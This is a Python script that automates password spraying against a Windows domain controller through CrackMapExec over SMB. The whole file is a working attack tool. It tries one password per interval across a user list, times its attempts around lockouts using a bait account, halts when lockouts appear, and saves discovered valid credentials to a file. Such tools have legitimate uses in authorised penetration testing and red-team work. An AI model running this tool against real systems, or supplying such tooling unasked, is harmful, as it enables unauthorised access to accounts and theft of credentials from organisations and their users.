#!/usr/bin/env python3

import argparse
import subprocess
import sys
import time
from pathlib import Path

"""
Password Spraying with CrackMapExec

Every -i minutes:
  • optionally spray a bait user once with a fixed wrong password before main spray
  • take the next password from the password list
  • run: crackmapexec smb <DC IP> -u <users file> -p <one password from password file>
  • append all output to the logfile
  • detect valid creds, lockouts, disabled/expired accounts
"""

GREEN = "\033[92m"
RED = "\033[91m"
PURPLE = "\033[95m"
RESET = "\033[0m"
BAIT_PASSWORD = "Wr0n6P@S5w0rd"

def parse_args():
    p = argparse.ArgumentParser(description="Interval password spray via CME (1 password every N minutes)")
    p.add_argument('--dc-ip', required=True, help="Domain controller IP for crackmapexec")
    p.add_argument('-u', '--users', required=True, type=Path, help="File with one username per line")
    p.add_argument('-p', '--passwords', required=True, type=Path, help="File with one password per line")
    p.add_argument('-i', '--interval', required=True, type=int, help="Interval in minutes between password sprays")
    p.add_argument('-f', '--outfile', required=True, type=Path, help="File to append all CME output to")
    p.add_argument('-bu', '--bait-user', required=False, help="Bait user to spray with invalid password before each main spray")
    return p.parse_args()


def load_list(path: Path):
    if not path.is_file():
        print(f"[-] File not found: {path}", file=sys.stderr)
        sys.exit(1)
    return [line.strip() for line in path.read_text().splitlines() if line.strip()]


def spray_password(dc_ip, users_file, password, outfile):
    cmd = [
        'crackmapexec', 'smb', dc_ip,
        '-u', str(users_file),
        '-p', password
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    output = result.stdout + result.stderr
    with open(outfile, 'a') as f:
        f.write(f"\n=== [{time.strftime('%Y-%m-%d %H:%M:%S')}] password: {password} ===\n")
        f.write(output)
    return output


def spray_bait_user(dc_ip, bait_user, outfile):
    bait_file = Path(".bait_user.tmp")
    bait_file.write_text(bait_user + "\n")
    print(f"[>] Spraying bait user {bait_user} with invalid password {BAIT_PASSWORD}")
    output = spray_password(dc_ip, bait_file, BAIT_PASSWORD, outfile)
    bait_file.unlink()
    return output


def check_lockouts(out, users):
    locked = set()
    for line in out.splitlines():
        if "ACCOUNT_LOCKED_OUT" in line:
            for token in line.split():
                if ':' in token:
                    user_part = token.split(':')[0]
                    username = user_part.split('\\')[-1]
                    if username in users:
                        locked.add(username)
    return locked


def check_valid_creds(out, users):
    valid_creds = []
    for line in out.splitlines():
        if '[+]' in line:
            for token in line.split():
                if ':' in token:
                    user_part = token.split(':')[0]
                    username = user_part.split('\\')[-1]
                    if username in users:
                        valid_creds.append(token)
    return valid_creds


def check_disabled_or_expired(out, users):
    flagged = {}
    for line in out.splitlines():
        for status in ["STATUS_ACCOUNT_DISABLED", "STATUS_PASSWORD_EXPIRED"]:
            if status in line:
                for token in line.split():
                    if ':' in token:
                        user_part = token.split(':')[0]
                        username = user_part.split('\\')[-1]
                        if username in users:
                            flagged[username] = status
    return flagged


def main():
    args = parse_args()
    interval_seconds = args.interval * 60
    users = load_list(args.users)
    passwords = load_list(args.passwords)
    print(f"[+] Loaded {len(users)} users and {len(passwords)} passwords.")
    print(f"[+] Interval: {args.interval} minute(s)")
    print(f"[+] Logging to {args.outfile}")
    if args.bait_user:
    	print("\033[1;33m[!] Make sure to add the bait user to the top of users list as well.\033[0m")

    for pwd in passwords:

        # Spray bait user first if configured
        if args.bait_user:
            bait_out = spray_bait_user(args.dc_ip, args.bait_user, args.outfile)
            bait_locked = check_lockouts(bait_out, users)
            if bait_locked:
                print(f"{RED}[!] Bait user '{args.bait_user}' got locked out!{RESET}")
                print(f"{RED}[!] Halting spray due to bait user lockout.{RESET}")
                sys.exit(0)

        print(f"[>] Spraying password: {pwd}")
        out = spray_password(args.dc_ip, args.users, pwd, args.outfile)

        # Valid credentials
        valid_creds = check_valid_creds(out, users)
        for cred in valid_creds:
            print(f"{GREEN}[+] Valid credentials: {cred}{RESET}")
            with open('valid_credentials.txt', 'a') as vf:
                vf.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} {cred}\n")

        # Disabled or expired accounts
        flagged = check_disabled_or_expired(out, users)
        if flagged:
            print(f"{PURPLE}[!] Disabled or expired accounts detected:{RESET}")
            for user, reason in flagged.items():
                print(f"{PURPLE}    - {user} ({reason}){RESET}")

        # Lockouts
        locked = check_lockouts(out, users)
        if locked:
            print(f"{RED}[!] Detected account lockout for:{RESET}")
            for u in locked:
                print(f"{RED}    - {u}{RESET}")
            print(f"{RED}[!] Halting spray due to lockouts.{RESET}")
            sys.exit(0)

        print(f"[+] Sleeping for {args.interval} minute(s)...")
        time.sleep(interval_seconds)

    print("[+] Finished spraying all passwords without lockouts.")


if __name__ == '__main__':
    main()
